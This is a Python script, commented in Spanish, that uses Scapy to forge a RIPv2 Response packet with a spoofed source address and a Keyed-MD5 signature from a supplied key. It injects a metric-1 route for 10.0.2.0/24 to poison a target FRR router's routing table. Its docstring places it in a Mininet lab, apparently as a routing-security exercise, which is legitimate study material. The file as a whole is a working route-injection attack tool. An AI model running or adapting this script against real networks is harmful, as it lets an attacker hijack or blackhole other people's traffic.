#!/usr/bin/env python3
"""
inject_rip.py -- Construye y envía un paquete RIPv2 Response falsificado,
firmado con Keyed-MD5 (RFC 2082), para envenenar la tabla de rutas de un
router FRR objetivo. Debe correr dentro de un host de Mininet en el mismo
segmento L2 que el router objetivo.

"""

import argparse
import hashlib
import struct
from scapy.all import IP, UDP, Ether, sendp

IFACE = "h1-eth0"

SPOOFED_SRC_IP = "10.0.1.99"
DST_IP = "224.0.0.9"
DST_MAC = "01:00:5e:00:00:09"

KEY_ID = 1
SEQ_NUMBER = 100

# .2.0 for h2 behind r2.
# r0 has it at 3 jumps via r1
# Trying to spoof it to 2 jumps
POISON_NETWORK = "10.0.2.0"
POISON_MASK = "255.255.255.0"
POISON_NEXT_HOP = "0.0.0.0"
POISON_METRIC = 1


def ip_to_bytes(ip: str) -> bytes:
    return bytes(int(o) for o in ip.split("."))


def build_route_entry(network, mask, next_hop, metric, route_tag=0):
    # Create the Rip response
    address_family_ip = 2
    return (
        struct.pack("!H", address_family_ip)
        + struct.pack("!H", route_tag)
        + ip_to_bytes(network)
        + ip_to_bytes(mask)
        + ip_to_bytes(next_hop)
        + struct.pack("!I", metric)
    )


def build_auth_header(packet_len, key_id, seq_number, digest_len=20):
    # Add auth header parts
    return (
        struct.pack("!H", 0xFFFF)
        + struct.pack("!H", 3)
        + struct.pack("!H", packet_len)
        + struct.pack("!B", key_id)
        + struct.pack("!B", digest_len)
        + struct.pack("!I", seq_number)
        + b"\x00" * 8
    )


def compute_signature(rip_body: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    if len(key_bytes) > 16:
        raise ValueError("la key no puede pasar de 16 bytes")
    return hashlib.md5(rip_body + key_bytes.ljust(16, b"\x00")).digest()


def build_rip_packet(command, version, key_id, seq_number, key, routes):
    header = struct.pack("!BBH", command, version, 0)
    route_entries = b"".join(build_route_entry(*r) for r in routes)
    packet_len = len(header) + 20 + len(route_entries)
    auth_header = build_auth_header(packet_len, key_id, seq_number)
    rip_body = header + auth_header + route_entries
    trailer_marker = struct.pack("!H", 0xFFFF) + struct.pack("!H", 1)
    signature = compute_signature(rip_body + trailer_marker, key)
    return rip_body + trailer_marker + signature


def inject(key, iface=IFACE, seq_number=SEQ_NUMBER):
    rip_payload = build_rip_packet(
        command=2,
        version=2,
        key_id=KEY_ID,
        seq_number=seq_number,
        key=key,
        routes=[(POISON_NETWORK, POISON_MASK, POISON_NEXT_HOP, POISON_METRIC)],
    )

    pkt = (
        Ether(dst=DST_MAC)
        / IP(src=SPOOFED_SRC_IP, dst=DST_IP, ttl=1)
        / UDP(sport=520, dport=520)
        / rip_payload
    )

    print(f"Paquete RIP construido ({len(rip_payload)} bytes)")
    print(f"Enviando por {iface}: {SPOOFED_SRC_IP} -> {DST_IP}, "
          f"envenenando {POISON_NETWORK}/{POISON_MASK}")

    sendp(pkt, iface=iface, verbose=True)
    print("Enviado. Verifica con: vtysh -c 'show ip route'")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("key", help="password (RIP MD5 auth key) a usar para firmar el paquete falsificado")
    parser.add_argument("--iface", default=IFACE, help=f"interfaz por la que enviar (default: {IFACE})")
    parser.add_argument("--seq", type=int, default=SEQ_NUMBER, help=f"número de secuencia RIP auth (default: {SEQ_NUMBER})")
    args = parser.parse_args()

    inject(args.key, iface=args.iface, seq_number=args.seq)